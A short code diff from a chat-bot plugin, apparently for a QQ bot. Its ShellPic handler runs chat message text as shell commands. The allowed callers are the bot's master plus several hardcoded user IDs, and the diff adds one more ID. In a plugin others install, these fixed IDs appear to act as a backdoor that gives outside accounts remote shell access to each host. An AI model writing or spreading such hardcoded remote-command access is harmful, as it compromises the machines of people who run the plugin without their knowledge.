@@ -239,7 +239,7 @@ export class File extends plugin {
   }
 
   async ShellPic(e) {
-    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
+    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 3065737952 || this.e.user_id == 923276093)) return false;
     const cmd = this.e.msg.replace("ly", "").trim()
     const ret = await Bot.exec(...prompt(cmd))
 
